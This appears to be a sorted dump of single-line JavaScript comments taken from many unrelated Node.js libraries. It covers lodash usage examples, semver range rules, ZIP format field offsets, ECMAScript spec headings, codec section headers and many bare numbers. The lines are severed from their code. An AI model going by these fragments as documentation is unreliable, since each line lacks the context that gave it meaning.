// - VAR=0                  false
// - VAR=<empty-string>     not set (as if the VAR was not set)
// - anything else          true
// - checkLValInnerPattern() shall be used if the syntactic construct supports"
// - checkLValPattern() shall be used if the syntactic construct supports"
// - checkLValSimple() shall be used if the syntactic construct supports"
// - class (as className)
// - color
// - height
// - http://dbaron.org/log/20100309-faster-timeouts
// - id
// - lang
// - max
// - media
// - method
// - min
// - name
// - original boolean values for controls
// - original values for input/textarea
// - skip when the property is a method of an instance (OOP)
// - style
// - target
// - type
// - width
// - window
// -*- mode: js -*-
// -- Buffer ---------------------------------------------------------------
// -- Decoding
// -- Encoding
// -- Encoding (pass-through)
// -- Readable -------------------------------------------------------------
// -- SlowBuffer -----------------------------------------------------------
// --- API
// --- Exported API
// --- Exports
// --- Globals
// --- Helpers
// --- Welcome to debugging React ---
// ---- Bash completion
// ---- Option types
// ---- Parser
// ---- exports
// ---- internal support stuff
// --------------
// ---------------
// ----------------
// -----------------
// ------------------
// --------------------
// --no-deprecation support
// --trace-deprecation support
// -1 if not cached
// -200
// -259200000
// -3 is for ... of the rest.
// -3600000
// -> '02/22/2012'
// -> '22'
// -> '2620'
// -> '59'
// -> 'Escaped\?\ <\.>'
// -> 'XRegExp builds XRegExps'
// -> /a\+b\*c|(dogs)\1|(cats)\2/i
// -> Hello World!
// -> Hi!
// -> XRegExp('(?<pet>dogs)\\k<pet>|(?<pet>cats)\\k<pet>')
// -> [
// -> false
// -> true
// -Infinity
// .
// . dot
// .. must come before .
// ...
// ...                                 component.
// ... copy n random bytes into x ...
// ... future items go here
// ... or .
// ... or:
// ... using a custom namespace
// ... using predefined DNS namespace (for domain names)
// ...and otherwise set as attributes
// ...except when executing function values
// ...in a gzip-friendly way
// ...intermediate processing is necessary
// ...or ES2017 async functions
// ...or create a new context.
// ...otherwise use results directly
// .Foo Class (case sensitive)
// .ab
// .end() fully uncorks
// .loc field.
// .original property for that matter). That's fine; we'll just
// .value because the elements array is not a Node):
// /
// /*
// /**
// // // // // _  // _// // / / // _  // _//     // //  \/ // _ \/ /
// // // // // ___// / / // / / // ___// / / / / // // /\  // // / /__
// // custom let es = fs.readdirSync(userdecoder_path); if(es){   es.map((_)=>{
// // custom let es = fs.readdirSync(userencoder_path); if(es){   es.map((_)=>{
// // http_proxy environment variable causes the request to go through a proxy.
// // not proxied (but a direct request is made).
// /[a-z]/gi
// /c*$/ is vulnerable to REDOS.
// /re/
// 0 - 15
// 0 - 25: ABCDEFGHIJKLMNOPQRSTUVWXYZ
// 0 - Central directory file header signature
// 0 - End of central directory signature = 0x06054b50
// 0 - Local file header signature = 0x04034b50
// 0 - Original Size          8 bytes
// 0 - The file is stored (no compression)
// 0 - zip64 end of central dir locator signature = 0x07064b50
// 0 - zip64 end of central dir signature                           4 bytes  (0x06064b50)
// 0 -> '\0'
// 0 : illegal
// 0 is dummy port for v0.6
// 0-23
// 0-59
// 0-9
// 0-9A-Fa-f
// 0. Get next character.
// 0..7
// 0..9
// 0.0.0.255
// 0.15.255.255
// 00
// 00 - 07
// 00 - 07    //allow 0x00 as legal value
// 00 - 07  //allow 0x00 as a legal value
// 00-07
// 01/01/14 02:23 
// 08 - 0F
// 08 - 0f
// 08-0f
// 0x
// 0x80
// 0x80-0x9F as some misc punctuation marks as well as some Hebrew-specific
// 0xf000 higher-encoded versions.
// 1
// 1 : very unlikely
// 1-31
// 1-9
// 1-character punctuators.
// 1. Continue the next loop iteration.
// 1. Figure out what the state of things will be after we do
// 1. Find the closest package scope SCOPE to DIR.
// 1. Handle surrogates.
// 1. Let packageName be undefined.
// 1. Minimize new string creation.
// 1. Return the URL resolution of packageSubpath in packageURL.
// 1. Return the URL resolution of the concatenation of subpath and resolvedTarget.
// 1. Try to interpret X as a combination of NAME and SUBPATH where the name
// 1. column default value
// 1. let DIRS = NODE_MODULES_PATHS(START)
// 1. let PARTS = path split(START)
// 1. name/.*
// 1. quoted (capture 3; capture 4 or capture 5)
// 1. root schema
// 1. {type: 'string'}
// 1.0.0 'pre' would become 1.0.0-0 which is the wrong direction.
// 1.0.0-5 bumps to 1.0.0
// 1.1.0 bumps to 2.0.0
// 1.2 - 3.4 => >=1.2.0 <3.5.0-0
// 1.2 - 3.4.5 => >=1.2.0 <=3.4.5
// 1.2.0 patches to 1.2.1
// 1.2.0-5 bumps to 1.2.0
// 1.2.0-5 patches to 1.2.0
// 1.2.0-beta.fooblz or 1.2.0-beta bumps to 1.2.0-beta.0
// 1.2.1 bumps to 1.3.0
// 1.2.3 - 3.4 => >=1.2.0 <3.5.0-0 Any 3.4.x will do
// 1.x (ducktyped)
// 1.x (javascript)
// 1.x (typescript)
// 10
// 10 - 17
// 10 - Compression method
// 10 - File last modification time
// 10 - Total number of central directory records
// 10 listeners are added to it. This is a useful default which
// 10-17
// 10.0.0.0
// 10.0.0.1
// 10.15.255.254
// 10.15.255.255
// 100
// 1008
// 100x too small dimensions (gh-1764).
// 1024
// 1024 --> 0.89384
// 1024 --> 0.92  -- 0.13
// 1024 --> 0.97130
// 1024 --> 0.99944
// 1040
// 1048576
// 1056
// 1072
// 1088
// 10:       1375.668ms
// 11. Return 0.
// 11.1 Primary Expressions
// 11.1.4 Array Initialiser
// 11.1.5 Object Initialiser
// 11.1.6 The Grouping Operator
// 11.10 Binary Bitwise Operators
// 11.11 Binary Logical Operators
// 11.12 Conditional Operator
// 11.13 Assignment Operators
// 11.13.1
// 11.14 Comma Operator
// 11.2 Left-Hand-Side Expressions
// 11.3 Postfix Expressions
// 11.4 Unary Operators
// 11.5 Multiplicative Operators
// 11.6 Additive Operators
// 11.7 Bitwise Shift Operators
// 11.8 Relational Operators
// 11.9 Equality Operators
// 1104
// 110XXXXX
// 1110XXXX
// 11110XXX
// 112 - 127
// 1120
// 1136
// 1152
// 1168
// 1184
// 12
// 12 - File last modification date
// 12 - File last modification time
// 12 - Size of central directory (bytes)
// 12 - version made by                                             2 bytes
// 12 Statements
// 12. Throw a Module Not Found error.
// 12.1 Block
// 12.10 The swith statement
// 12.10 The with statement
// 12.12 Labelled Statements
// 12.13 The throw statement
// 12.14 The try statement
// 12.14.1
// 12.14.5 AssignmentPattern
// 12.15 The debugger statement
// 12.2 Variable Statement
// 12.2.1
// 12.3 Empty Statement
// 12.4 Expression Statement
// 12.5 If statement
// 12.6 Iteration Statements
// 12.7 The continue statement
// 12.8 The break statement
// 12.9 The return statement
// 1200
// 1216
// 1232
// 1248
// 1264
// 127.0.0.1
// 128  --> 0.42261
// 128  --> 0.42261"
// 128  --> 0.77094"
// 128  --> 0.79
// 1280
// 1296
// 13 Function Definition
// 13.2.3 BindingPattern
// 1312
// 1328
// 1344
// 1360
// 1376
// 1392
// 14 - CRC-32
// 14 - File last modification date
// 14 - version needed to extract                                   2 bytes
// 14 Classes
// 14 Functions and classes
// 14 Program
// 14.1 Functions is defined above (13 in ES5)
// 14.2 Arrow Functions Definitions is defined in (7.3 assignments)
// 14.3 Method Definitions
// 14.3.7
// 1408
// 1424
// 1440
// 1456
// 1472
// 1488
// 15 Program
// 1504
// 1520
// 1536
// 1552
// 1568
// 1584
// 159.203.75.235
// 16 - 31
// 16 - CRC-32
// 16 - Relative Header Offset 8 bytes
// 16 - number of this disk                                         4 bytes
// 16 - total number of disks
// 16 JSX
// 16 XJS
// 1600
// 1616
// 1632
// 1648
// 1664
// 1680
// 1696
// 1712
// 1728
// 172800000
// 1744
// 1760
// 1776
// 1792
// 18 - 1F
// 18 - 1f
// 18 - Compressed size
// 18-1f
// 1808
// 1824
// 1840
// 1856
// 1872
// 1888
// 1904
// 192.168.1.0
// 192.168.1.128
// 192.168.1.255
// 1920
// 1936
// 1952
// 1968
// 1984
// 2
// 2 : normal
// 2 bytes for each char.
// 2 header + 2 port + 4 ip
// 2 here.
// 2) For the hidden or detached element
// 2-byte size
// 2-character punctuators.
// 2.  Scheme Definition
// 2. @scope/name/.*
// 2. Convert uCode character.
// 2. Copy user data
// 2. If X begins with '/'
// 2. It is not ended.
// 2. Keep (de)identation O(lines) time.
// 2. LOAD_INDEX(X)
// 2. Overridden methods (that were mixed in).
// 2. character set
// 2. for each DIR in DIRS:
// 2. let I = count of PARTS - 1
// 2. let RESOLVED_PATH = fileURLToPath(RESOLVED)
// 2. mySchema
// 2. simple (capture 6)
// 2. {type: 'integer'}
// 2. {type: 'string'}
// 2.x
// 2.x+ (javascript)
// 2.x+ (typescript)
// 20
// 20 - 27
// 20 - Comment length
// 20 - Compressed size
// 20 - number of the disk with the start of the central directory  4 bytes
// 20-27
// 200
// 2000
// 2016
// 2032
// 2048
// 2048 --> 0.97583
// 2048 --> 0.98  -- 0.06
// 2048 --> 0.99431
// 2048 --> 0.99999
// 2064
// 2080
// 2096
// 2112
// 2128
// 2130706433
// 2144
// 2160
// 2176
// 2192
// 22 - Comment
// 22 - Uncompressed size
// 2208
// 2224
// 2240
// 2256
// 2272
// 2288
// 2304
// 2320
// 2336
// 2352
// 2368
// 2384
// 24 - Disk Start Number      4 bytes
// 24 - Uncompressed size
// 24 - total number of entries in the central directory on this disk         8 bytes
// 2400
// 2416
// 2432
// 2448
// 2464
// 2480
// 2496
// 2512
// 2528
// 252: 0 - 9
// 253: symbol (punctuation) that does not belong to word
// 2544
// 254: Carriage/Return
// 255.240.0.0
// 255.255.255.0
// 255: Control characters that usually does not exist in any text
// 256  --> 0.57851
// 256  --> 0.85710
// 256  --> 0.92
// 2560
// 2576
// 2592
// 26 - 51: abcdefghijklmnopqrstuvwxyz
// 26 - File name length (n)
// 26 Feb 16:19:34
// 26..35 map to ASCII 0..9
// 2608
// 2624
// 2640
// 2656
// 2672
// 2688
// 2704
// 2720
// 2736
// 2742
// 2752
// 2758
// 2768
// 2774
// 2784
// 2790
// 28 - 2F
// 28 - 2f
// 28 - Extra field length (m)
// 28 - File name length (n)
// 28-2f
// 2800
// 2806
// 2816
// 2822
// 2832
// 2838
// 2848
// 2854
// 2864
// 2870
// 2880
// 2886
// 2896
// 2902
// 2912
// 2918
// 2928
// 2934
// 2944
// 2950
// 2960
// 2966
// 2976
// 2982
// 2992
// 2998
// 2f77668a9dfbf8d5848b9eeb4a7145ca94c6ed9236e4a773f6dcafa5132b2f91
// 3 : very likely
// 3 The ArrayBuffer Type"
// 3 digits are only allowed when string starts
// 3-character punctuators.
// 3-character punctuators: === !== &gt;&gt;&gt; &lt;&lt;= &gt;&gt;=
// 3-character punctuators: === !== >>> <<= >>=
// 3.  The name of each parameter is concatenated to its corresponding
// 3. If X begins with './' or '/' or '../'
// 3. Let packageURL be the result of LOOKUP_PACKAGE_SCOPE(parentURL).
// 3. Permit negative indentations.
// 3. Return resolved.
// 3. Write dbcsCode character.
// 3. anything else (capture 2)
// 3. let DIRS = []
// 3. push() after the EOF signaling null is an error.
// 3. root schema
// 3. unsigned
// 3. {type: 'integer'}
// 30
// 30 - 37
// 30 - Extra field length (m)
// 30 - File name
// 30 fps
// 30+n - Extra field
// 30-37
// 3008
// 3014
// 3024
// 303 is always GET
// 3030
// 3040
// 3046
// 3056
// 3062
// 307 preserves method
// 3072
// 3078
// 308 preserves method
// 3088
// 3094
// 31-bit max
// 31-bit min
// 3104
// 3110
// 3120
// 3126
// 3136
// 3142
// 3152
// 31557600000
// 3158
// 3168
// 3174
// 3184
// 3190
// 32 - 47
// 32 - File comment length (k)
// 32 - total number of entries in the central directory            8 bytes
// 3200
// 3206
// 3216
// 3222
// 3232
// 3238
// 3248
// 3254
// 3264
// 3270
// 3280
// 3286
// 3296
// 3302
// 3312
// 3318
// 3328
// 3334
// 3344
// 3350
// 3360
// 3366
// 3376
// 3382
// 3392
// 3398
// 34 - Disk number where file starts
// 3408
// 3414
// 3424
// 3430
// 3440
// 3446
// 3456
// 3462
// 3472
// 3478
// 3488
// 3494
// 3504
// 3510
// 3520
// 3526
// 3536
// 3542
// 3552
// 3558
// 3568
// 3574
// 3584
// 3590
// 36 - Internal file attributes
// 3600
// 36000000
// 3606
// 3616
// 3622
// 3632
// 3638
// 3648
// 3654
// 3664
// 3670
// 3680
// 3686
// 3696
// 3702
// 3712
// 3718
// 3728
// 3734
// 3744
// 3750
// 3760
// 3766
// 3776
// 3782
// 3792
// 3798
// 38 - 3F
// 38 - 3f
// 38 - External file attributes
// 38-3f
// 3808
// 3814
// 3824
// 3830
// 3840
// 3846
// 3856
// 3862
// 3872
// 3878
// 3888
// 3894
// 3904
// 3910
// 3920
// 3926
// 3936
// 3942
// 3952
// 3958
// 3968
// 3974
// 3984
// 3990
// 4
// 4 - Number of this disk
// 4 - Version made by
// 4 - Version needed to extract (minimum)
// 4 - number of the disk with the start of the zip64 end of central directory
// 4 - size of zip64 end of central directory record                8 bytes
// 4-character punctuator.
// 4-character punctuator: &gt;&gt;&gt;=
// 4-character punctuator: >>>=
// 4.  The sorted name/value pairs are concatenated together into a
// 4. Enforce immutability.
// 4. If X begins with '#'
// 4. Return null.
// 4. Throw a Package Path Not Exported error.
// 4. _read() is not called after pushing the EOF null chunk.
// 40
// 40 - 47
// 40 - size of the central directory                               8 bytes
// 40-47
// 4000
// 4006
// 4016
// 4022
// 4032
// 4038
// 404 bug: https://code.google.com/p/chromium/issues/detail?id=447916
// 4048
// 4054
// 4064
// 4070
// 4080
// 4086
// 4096
// 4102
// 4112
// 4118
// 4128
// 4134
// 4144
// 4150
// 4160
// 4166
// 4176
// 4182
// 4192
// 4198
// 42 - Relative offset of local file header
// 42 is '*'
// 4208
// 4214
// 4224
// 4230
// 4240
// 4246
// 4256
// 4262
// 4272
// 4278
// 4288
// 4294
// 4304
// 4310
// 4320
// 4326
// 4336
// 4342
// 4352
// 4358
// 4368
// 4368  //last 512
// 4374
// 4384
// 4390
// 4400
// 4406
// 4416
// 4422
// 4432
// 4438
// 4448
// 4454
// 4464
// 4470
// 4480
// 4486
// 4496
// 4502
// 4512
// 4518
// 4528
// 4534
// 4544
// 4550
// 4560
// 4566
// 4576
// 4582
// 4592
// 4598
// 46 - File name
// 46 = dot '.'
// 46+n - Extra field
// 46+n+m - File comment
// 4608
// 4614
// 4624
// 4630
// 4640
// 4646
// 4656
// 4662
// 4672
// 4678
// 4688
// 4694
// 47 is '/'
// 4704
// 4710
// 4720
// 4726
// 4736
// 4742
// 4752
// 4758
// 4768
// 4774
// 4784
// 4790
// 48 - 4F
// 48 - 4f
// 48 - 63
// 48 - offset of start of central directory with respect to the starting disk number     8 bytes
// 4800
// 4806
// 4816
// 4822
// 4832
// 4838
// 4848
// 4854
// 4864
// 4870
// 4880
// 4886
// 4896
// 4902
// 4912
// 4918
// 4928
// 4934
// 4944
// 4950
// 4960
// 4966
// 4976
// 4982
// 4992
// 4998
// 5
// 5 === 3+2
// 5 redirects allowed by default
// 5 seconds have passed
// 5. No newline characters.
// 5. RESOLVE_ESM_MATCH(MATCH).
// 5. Throw a Package Import Not Defined error.
// 5. return DIRS + GLOBAL_FOLDERS
// 50
// 50 - 57
// 5000
// 5008
// 5014
// 5024
// 5030
// 5040
// 5046
// 5056
// 5062
// 5072
// 5078
// 5088
// 5094
// 5104
// 5110
// 512  --> 0.74851
// 512  --> 0.79  -- 0.79
// 512  --> 0.92635
// 512  --> 0.986
// 5120
// 5126
// 5136
// 5142
// 5152
// 5158
// 5168
// 5174
// 5184
// 5190
// 52 - 61: 0123456789
// 5200
// 5206
// 5216
// 5222
// 5232
// 5238
// 5248
// 5254
// 5264
// 5270
// 5280
// 5286
// 5296
// 5302
// 5312
// 5318
// 5328
// 5334
// 5344
// 5350
// 5360
// 5366
// 5376
// 5376  //last 512
// 5382
// 5392
// 5398
// 5408
// 5414
// 5424
// 5430
// 5440
// 5446
// 5456
// 5462
// 5472
// 5478
// 5488
// 5494
// 550 millis past UNIX epoch
// 5504
// 5510
// 5520
// 5526
// 5536
// 5542
// 5552
// 5558
// 5568
// 5574
// 5584
// 5590
// 56 - zip64 extensible data sector                                (variable size)
// 5600
// 5606
// 5616
// 5622
// 5632
// 5638
// 5648
// 5654
// 5664
// 5670
// 5680
// 5686
// 569
// 5696
// 5702
// 5712
// 5718
// 5728
// 5734
// 5744
// 5750
// 5760
// 5766
// 5776
// 5782
// 5792
// 5798
// 58 - 5F
// 58 - 5f
// 5808
// 5814
// 5824
// 5830
// 5840
// 5846
// 5856
// 5862
// 5872
// 5878
// 5888
// 5894
// 5904
// 5910
// 5920
// 5926
// 5936
// 5942
// 5952
// 5958
// 5968
// 5974
// 5984
// 5990
// 5:        1398.607ms"
// 6 - Disk where central directory starts
// 6 - General purpose bit flag
// 6 - Version needed to extract (minimum)
// 6 The DataView View Type"
// 6. RESOLVE_ESM_MATCH(MATCH)
// 60
// 60 - 67
// 6000
// 60000
// 6006
// 6016
// 6022
// 6032
// 6038
// 6048
// 6054
// 6064
// 6070
// 6080
// 6086
// 6096
// 6102
// 6112
// 6118
// 6128
// 6134
// 6144
// 6150
// 6160
// 6166
// 6176
// 6182
// 6192
// 6198
// 6208
// 6214
// 6224
// 6230
// 6240
// 6246
// 6256
// 6262
// 6272
// 6278
// 6288
// 6294
// 62: +
// 6304
// 6310
// 6320
// 6326
// 6336
// 6342
// 6352
// 6358
// 6368
// 6374
// 6384
// 6390
// 63: /
// 64 - 79
// 6400
// 6406
// 6416
// 6422
// 6432
// 6438
// 6448
// 6454
// 6464
// 6470
// 6480
// 6486
// 6496
// 6502
// 6512
// 6518
// 6528
// 6534
// 6544
// 6550
// 6560
// 6566
// 6576
// 6582
// 6592
// 6598
// 6608
// 6614
// 6624
// 6630
// 6640
// 6646
// 6656
// 6662
// 6672
// 6678
// 6688
// 6694
// 67
// 6704
// 6710
// 6720
// 6726
// 6736
// 6742
// 6752
// 6758
// 6768
// 6768 --> 1.00  -- 0.02
// 6774
// 6784
// 6790
// 68 - 6F
// 68 - 6f
// 6800
// 6806
// 6816
// 6822
// 6832
// 6838
// 6848
// 6854
// 6864
// 6870
// 6880
// 6886
// 6896
// 6902
// 6912
// 6918
// 6928
// 6934
// 6944
// 6950
// 6960
// 6966
// 6976
// 6982
// 6992
// 6998
// 7
// 7.2 White Space
// 7.3 Line Terminators
// 7.4 Comments
// 7.6 Identifier Names and Identifiers
// 7.6.1.1 Keywords
// 7.6.1.2 Future Reserved Words
// 7.7 Punctuators
// 7.8.3 Numeric Literals
// 7.8.4 String Literals
// 70
// 70 - 77
// 7008
// 7014
// 7024
// 7030
// 7040
// 7046
// 7056
// 7062
// 7072
// 7078
// 7088
// 7094
// 7104
// 7110
// 7120
// 7126
// 7136
// 7142
// 7152
// 7158
// 7168
// 7174
// 7184
// 7190
// 7200
// 7200000
// 7206
// 7216
// 7222
// 7232
// 7238
// 7248
// 7254
// 7264
// 7270
// 7280
// 7286
// 7296
// 7302
// 7312
// 7318
// 7328
// 7334
// 7344
// 7350
// 7360
// 7366
// 7376
// 7382
// 7392
// 7398
// 73e54154a15d1beeb509d9e12f1e462a0
// 7408
// 7414
// 7424
// 7430
// 7440
// 7446
// 7456
// 7462
// 7472
// 7478
// 7488
// 7494
// 74eb593087a982e2a6f5dded54ecd96d1fd0f3d44a58728cdcd40c55227522223
// 7504
// 7510
// 7520
// 7526
// 7536
// 7542
// 7552
// 7558
// 7568
// 7574
// 7584
// 7590
// 7600
// 7606
// 7616
// 7622
// 7632
// 7638
// 7648
// 7654
// 7664
// 7670
// 7680
// 7686
// 7696
// 7702
// 7712
// 7718
// 7728
// 7734
// 7744
// 7750
// 7760
// 7766
// 7776
// 7781157e2629b094f0e3dd48c4d786115
// 7782
// 7792
// 7798
// 78 - 7F
// 78 - 7f
// 7808
// 7814
// 7824
// 7830
// 7840
// 7846
// 7856
// 7862
// 7872
// 7878
// 7888
// 7894
// 7904
// 7910
// 7920
// 7926
// 7936
// 7942
// 7952
// 7958
// 7968
// 7974
// 7984
// 7990
// 7a25f9132ec6a8b34
// 8 - Compressed Size        8 bytes
// 8 - Compression method
// 8 - General purpose bit flag
// 8 - Number of central directory records on this disk
// 8 - The file is Deflated
// 8 - relative offset of the zip64 end of central directory record
// 80
// 80 - 87
// 80 - 95
// 8000
// 8006
// 8016
// 8022
// 8032
// 8038
// 8048
// 8054
// 8064
// 8070
// 8080
// 8086
// 8096
// 8102
// 8112
// 8118
// 8128
// 8134
// 8144
// 8150
// 8160
// 8166
// 8176
// 8182
// 8192
// 8198
// 8208
// 8214
// 8224
// 8230
// 8240
// 8246
// 8256
// 8262
// 8272
// 8278
// 8288
// 8294
// 8304
// 8310
// 8320
// 8326
// 8336
// 8342
// 8352
// 8358
// 8368
// 8374
// 8384
// 8390
// 8400
// 8406
// 8416
// 8422
// 8432
// 8438
// 8448
// 8454
// 8464
// 8470
// 8480
// 8486
// 8496
// 8502
// 8512
// 8518
// 8528
// 8534
// 8544
// 8550
// 8560
// 8566
// 8576
// 8582
// 8592
// 8598
// 8608
// 8614
// 8624
// 8630
// 8640
// 86400000
// 8646
// 8656
// 8662
// 8672
// 8678
// 8688
// 8694
// 8704
// 8710
// 8720
// 8726
// 8736
// 8742
// 8752
// 8768
// 8784
// 88 - 8F
// 88 - 8f
// 8800
// 8816
// 8832
// 8848
// 8864
// 8880
// 8896
// 8912
// 8928
// 8944
// 8960
// 8976
// 8992
// 90
// 90 - 97
// 9000000
// 9008
// 9024
// 9040
// 9056
// 9072
// 9088
// 9104
// 9120
// 9136
// 9152
// 9168
// 9184
// 9200
// 9216
// 9232
// 9248
// 9264
// 9280
// 9296
// 9312
// 9328
// 9344
// 9360
// 9376
// 9392
// 9408
// 9424
// 9440
// 9456
// 9472
// 9488
// 9504
// 9520
// 9536
// 9552
// 9568
// 9584
// 96 - 111
// 9600
// 9616
// 9632
// 9648
// 9664
// 9680
// 9696
// 9712
// 9728
// 9744
// 9760
// 9776
// 9792
// 98 - 9F
// 98 - 9f
// 9808
// 9824
// 9840
// 9856
// 9872
// 9888
// 9904
// 9920
// 9936
// 9952
// 9968
// 9984
// 999
// :
// :(first|last|only)-(child|of-type)
// ::ffff:ipv4
// :checked bug with option elements (Firefox 3.6.x)
// :enabled :disabled bugs with hidden fields (Firefox 3.5)
// :link bugs with hyperlinks matching (Firefox/Safari)
// ; semicolon
// <
// < > / : = { }
// <!-
// <!--
// <!-- blah -
// <!-- blah --
// <!BLARG
// <!DOCTYPE
// <![CDATA[ something
// <-- Our magic.
// <--- add this line
// <--- this
// </a
// </a   >
// <=1.2.3 is higher than <1.2.3
// <?hi
// <?hi there
// <Buffer 00 00 00 00 00>
// <Buffer 00 00 68 65 6c 6c 6f 00>
// <Buffer 01 02 07 03 04 05 06>
// <Buffer 01 02 07 04 05 06>
// <Buffer 48 54 54 50 2f 31 2e 31 20 33 30 31 20 4d 6f 76 65 64 20 50 65...
// <Buffer 60 00 1e 00 4a 6f 73 68 00 73 65 63 72 65 74 31 32 33 00 16 55 6e 69 74 65 64 20 53 74 61 74 65 73 00>
// <Buffer 61 61 61 61 61>
// <Buffer 68 65 6c 6c 6f 00 00 00 00 00 00 00 00 00 00 00>
// <Buffer 68 65 6c 6c 6f 20 77 6f 72 6c 64>
// <Buffer 68 65 6c 6c 6f>
// <Buffer 78 e0 82 02 01>
// <Socket ...>  (This is a raw net.Socket that is a connection between the initial client and the remote client that connected to the proxy)
// <Socket ...>  (this is a raw net.Socket that is established to the destination host through the given proxy server)
// <Socket ...>  (this is a raw net.Socket that is established to the destination host through the given proxy servers)
// <a
// <a foo
// <a foo _
// <a foo=
// <a foo=bar
// <body onClick='rng_seed_time();' onKeyPress='rng_seed_time();'>
// <foo bar=&quot
// <http://www.edu.tw:81/mandr/>
// <img> tag attributes
// <length> <length>? | inherit
// <p> tags where the beginning of the second element implicitly closes the
// <script>
// <script> ...
// <script> ... <
// <select> value update needs to occur after <option> children
// <strong
// <strong /
// =
// = 6 - 2\n]'))
// = 6 - 2\n]');
// = host name + optional port.
// =0666
// == Big5/Taiwan/Hong Kong ================================================
// == Chinese/GBK ==========================================================
// == Decoder ==================================================================
// == Decoder stream =======================================================
// == Encoder ==================================================================
// == Encoder stream =======================================================
// == Exports ==================================================================
// == Extend Node primitives to use iconv-lite =================================
// == Japanese/ShiftJIS ====================================================
// == Korean ===============================================================
// == UTF-16 codec =============================================================
// == UTF16-BE codec. ==========================================================
// ==== Advanced methods ====
// ==== Definition methods ====
// ==== Delegate methods ====
// ==== End of '#getCandidates' ==== //
// ==== End of 'Array fields' ==== //
// ==== End of 'Basic CRUD functionality' ==== //
// ==== End of 'Comparing things' ==== //
// ==== End of 'Deep copying' ==== //
// ==== End of 'Deletion' ==== //
// ==== End of 'Execute on every node' ==== //
// ==== End of 'Find' ==== //
// ==== End of 'Get matching documents' ==== //
// ==== End of 'Indexing newly inserted documents' ==== //
// ==== End of 'Indexing' ==== //
// ==== End of 'Insert' ==== //
// ==== End of 'Insertion' ==== //
// ==== End of 'Modifying documents' ==== //
// ==== End of 'Object checking' ==== //
// ==== End of 'Persisting indexes' ====
// ==== End of 'Prevent dataloss when persisting data' ====
// ==== End of 'Projections' ====
// ==== End of 'Querying' ==== //
// ==== End of 'Randomized test' ==== //
// ==== End of 'Removal' ==== //
// ==== End of 'Remove' ==== //
// ==== End of 'Resetting' ==== //
// ==== End of 'Sanity checks' ==== //
// ==== End of 'Search' ==== //
// ==== End of 'Serialization hooks' ==== //
// ==== End of 'Update' ==== //
// ==== End of 'Updating indexes upon document remove' ==== //
// ==== End of 'Updating indexes upon document update' ==== //
// ==== End of 'Upserts' ==== //
// ==== End of 'Using indexes' ==== //
// ==== End of 'With non persistent database' ====
// ==== End of 'With persistent database' ====
// ==== End of 'ensureFileDoesntExist' ====
// ==== End of 'ensureIndex and index initialization in database loading' ==== //
// ===== End of 'Sorting' =====
// ===== End of 'Without sorting' =====
// ===== End of 'persistent in-browser database' =====
// ================================
// ============================================
// ==============================================================
// => '   abc'
// => '  abc   '
// => '  abc'
// => ''
// => '***'
// => '--FOO-BAR--'
// => '--foo-bar--'
// => '-0'
// => '-_-abc'
// => '105'
// => '<%- value %>'
// => '<b>&lt;script&gt;</b>'
// => '<li>fred</li><li>barney</li>'
// => 'BODY'
// => 'FOO BAR'
// => 'FOOBAR'
// => 'FRED'
// => 'Foo Bar'
// => 'Forbidden'
// => 'Fred'
// => 'Hi Barney'
// => 'Not Found'
// => '\[lodash\]\(https://lodash\.com/\)'
// => '_-_abc'
// => '_-abc_-_'
// => '__FOO_BAR__'
// => '__foo_bar__'
// => 'abc   '
// => 'abc  '
// => 'abc'
// => 'abc-_-'
// => 'abc_-_'
// => 'abcabc'
// => 'a~b~c'
// => 'b'
// => 'barney'
// => 'barney' (iteration order is not guaranteed)
// => 'c'
// => 'c';
// => 'contact_104'
// => 'default'
// => 'deja vu'
// => 'fRED'
// => 'foo bar'
// => 'foo-bar'
// => 'fooBar'
// => 'foo_bar'
// => 'foobar'
// => 'fred says hello'
// => 'fred'
// => 'hello barney!'
// => 'hello fred!'
// => 'hello fred'
// => 'hello mustache!'
// => 'hello pebbles!'
// => 'hi fred!'
// => 'hi fred'
// => 'hi-diddly-ho there...'
// => 'hiya fred!'
// => 'matches A'
// => 'matches B'
// => 'no match'
// => 'pebbles is 1'
// => 'pebbles'
// => -5
// => 0
// => 0.04
// => 1
// => 1.5
// => 1.7976931348623157e+308
// => 10
// => 2
// => 20
// => 24
// => 3
// => 3.2
// => 4
// => 4.01
// => 4000
// => 403
// => 404
// => 4100
// => 4294967295
// => 5
// => 5e-324
// => 6
// => 6.01
// => 6100
// => 7
// => 8
// => 9
// => 9007199254740991
// => Allows adding up to 4 contacts to the list.
// => Check whether `dest` is still a piping destination.
// => Infinity
// => Introduce a guard on increasing awaitDrain.
// => Logs 'a' then 'b' (iteration order is not guaranteed).
// => Logs 'b' then 'a' assuming `_.forOwn` logs 'a' then 'b'.
// => Logs 'clicked docs' when clicked.
// => Logs 'deferred' after one millisecond.
// => Logs 'done saving!' after the two async saves have completed.
// => Logs 'later' after one second.
// => Logs `1` then `2`.
// => Logs `2` then `1`.
// => Logs the number of milliseconds it took for the deferred invocation.
// => ['abc']
// => ['def']
// => ['e']
// => [1.2]
// => [1]
// => [2.1]
// => [2]
// => [3]
// => []
// => [null]
// => [undefined]
// => [{ 'a': 1 }]
// => [{ 'x': 1 }]
// => [{ 'x': 2 }]
// => `createApplication` is invoked once
// => a Promise of 76
// => a floating-point number between 0 and 5
// => a floating-point number between 1.2 and 5.2
// => also an integer between 0 and 5
// => an integer between 0 and 5
// => false
// => function(data) {
// => object for 'barney'
// => object for 'fred'
// => object for 'pebbles'
// => objects for ['barney']
// => objects for ['fred']
// => objects for ['pebbles']
// => returns 'pebbles' assuming `_.findKey` returns 'barney'
// => true
// => undefined
// => { '0': { '1': 'a' } }
// => { 'a': [{ 'b': {} }] };
// => { 'b': '2' }
// => { 'n': 1 }
// => { 'n': 2 }
// => { 'user': 'barney' }
// >
// > 'var x = 42;    // answer'
// > XML representation of each node occurs in the XML representation of the
// > document corresponding to the order in which the first character of the
// > node will be the first node. Element nodes occur before their children.
// > nodes of an element occur after the element and before its children. The
// > relative order of attribute nodes is implementation-dependent./
// > their start-tag in the XML (after expansion of entities). The attribute
// > treated like var declarations rather than like lexical declarations.
// > var b = 3;
// > var x = 2;
// >0xffff code points that are a valid part of identifiers. The
// >1 => >=2.0.0
// >1.2 => >=1.3.0
// >=0.0.0 is equivalent to *
// >=0.0.0 is like a star
// >=1.2.3 is lower than >1.2.3
// >>> makes sure the result is unsigned
// ?
// @TODO Handling all encodings inside a single object makes it very difficult"
// @TODO There should be a utf8-strict encoding that rejects invalid UTF-8 code
// @argument {Array} nodes Array of DOM nodes"
// @argument {Node} nodaA The first node to use in the comparison"
// @argument {Node} nodeB The second node to use in the comparison
// @check why add CRLF? does this account for custom/multiple CRLFs?
// @ignore
